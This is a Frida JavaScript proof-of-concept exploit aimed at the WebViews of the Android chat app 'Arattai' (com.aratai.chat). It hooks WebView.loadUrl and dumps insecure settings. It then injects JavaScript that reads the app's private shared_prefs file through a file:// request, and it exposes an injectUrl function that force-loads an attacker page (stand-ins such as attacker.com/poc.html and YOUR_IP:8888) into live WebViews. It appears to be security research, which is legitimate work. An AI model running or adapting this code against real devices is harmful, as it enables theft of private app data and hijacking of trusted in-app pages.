/*
 * Arattai - Force Load Attacker URL in MiniApp WebView
 *
 * This script proves the WebView vulnerability by:
 * 1. Waiting for any WebView to be created
 * 2. Dumping its security settings (proving misconfiguration)
 * 3. Optionally injecting attacker URL to test file access + bridge
 *
 * Usage:
 *   frida -U -f com.aratai.chat -l frida_force_webview.js --no-pause
 *
 * Then open any MiniApp/business app in the chat to trigger WebView creation.
 */

var ATTACKER_URL = 'http://YOUR_IP:8888/webview_exploit.html';

Java.perform(function() {
    console.log('[*] Arattai WebView Force-Load PoC');
    console.log('');

    // ========== Intercept WebView creation and dump config ==========
    var WebView = Java.use('android.webkit.WebView');
    var webviewCount = 0;

    WebView.$init.overload('android.content.Context').implementation = function(ctx) {
        webviewCount++;
        console.log('[+] WebView #' + webviewCount + ' created');
        return this.$init(ctx);
    };

    // ========== Intercept loadUrl to prove what URLs are loaded ==========
    WebView.loadUrl.overload('java.lang.String').implementation = function(url) {
        console.log('');
        console.log('=== WebView.loadUrl() ===');
        console.log('  URL: ' + url);

        // Dump security settings
        var s = this.getSettings();
        console.log('  --- Security Settings ---');
        console.log('  JavaScriptEnabled:    ' + s.getJavaScriptEnabled());
        console.log('  AllowFileAccess:      ' + s.getAllowFileAccess());
        console.log('  AllowContentAccess:   ' + s.getAllowContentAccess());
        console.log('  MixedContentMode:     ' + s.getMixedContentMode() + (s.getMixedContentMode() === 0 ? ' (ALWAYS_ALLOW!)' : ''));
        console.log('  DomStorageEnabled:    ' + s.getDomStorageEnabled());
        console.log('  DatabaseEnabled:      ' + s.getDatabaseEnabled());
        console.log('  SaveFormData:         ' + s.getSaveFormData());

        try {
            console.log('  AllowFileAccessFromFileURLs:      ' + s.getAllowFileAccessFromFileURLs());
            console.log('  AllowUniversalAccessFromFileURLs: ' + s.getAllowUniversalAccessFromFileURLs());
        } catch(e) {}

        // Check if this is a MiniApp WebView (has dangerous settings)
        if (s.getAllowFileAccess() && s.getJavaScriptEnabled()) {
            console.log('');
            console.log('  [!!!] VULNERABLE WEBVIEW DETECTED');
            console.log('  [!!!] JS=true + FileAccess=true + ContentAccess=' + s.getAllowContentAccess());
            console.log('  [!!!] This WebView can access local files via JavaScript');

            // Prove it by injecting our test after the page loads
            var webview = this;
            setTimeout(function() {
                try {
                    // Inject JS to test file access
                    var testJS = "(function(){" +
                        "var x=new XMLHttpRequest();" +
                        "x.open('GET','file:///data/data/com.aratai.chat/shared_prefs/com.aratai.chat_preferences.xml',false);" +
                        "try{x.send();return 'FILE_READ:'+x.responseText.length+'bytes'}catch(e){return 'FILE_BLOCKED:'+e.message}" +
                        "})()";

                    webview.evaluateJavascript(testJS, Java.use('android.webkit.ValueCallback').$new({
                        onReceiveValue: function(value) {
                            console.log('  [FILE-ACCESS-TEST] Result: ' + value);
                        }
                    }));
                } catch(e) {
                    console.log('  [FILE-ACCESS-TEST] Error: ' + e.message);
                }
            }, 3000);
        }

        return this.loadUrl(url);
    };

    // ========== Monitor evaluateJavascript for code injection ==========
    WebView.evaluateJavascript.implementation = function(script, cb) {
        if (script.length < 500) {
            console.log('[EVAL] ' + script);
        } else {
            console.log('[EVAL] (script ' + script.length + ' chars): ' + script.substring(0, 100) + '...');
        }
        return this.evaluateJavascript(script, cb);
    };

    // ========== Monitor CookieManager ==========
    try {
        var CookieManager = Java.use('android.webkit.CookieManager');
        CookieManager.setAcceptThirdPartyCookies.implementation = function(wv, accept) {
            console.log('[COOKIE] setAcceptThirdPartyCookies(' + accept + ')');
            if (accept) {
                console.log('[!!!] Third-party cookies enabled - session leakage risk');
            }
            return this.setAcceptThirdPartyCookies(wv, accept);
        };
    } catch(e) {}

    // ========== Provide manual trigger function ==========
    console.log('');
    console.log('[*] Hooks installed. Open any MiniApp in the chat.');
    console.log('[*] Watch for [!!!] markers in output.');
    console.log('');
    console.log('[*] To manually force-load attacker URL in an active WebView:');
    console.log('[*]   In Frida REPL: rpc.exports.injectUrl("http://attacker.com/poc.html")');

    rpc.exports = {
        injectUrl: function(url) {
            Java.perform(function() {
                Java.choose('android.webkit.WebView', {
                    onMatch: function(wv) {
                        console.log('[INJECT] Found WebView, loading: ' + url);
                        Java.scheduleOnMainThread(function() {
                            wv.loadUrl(url);
                        });
                    },
                    onComplete: function() {
                        console.log('[INJECT] Scan complete');
                    }
                });
            });
        }
    };
});
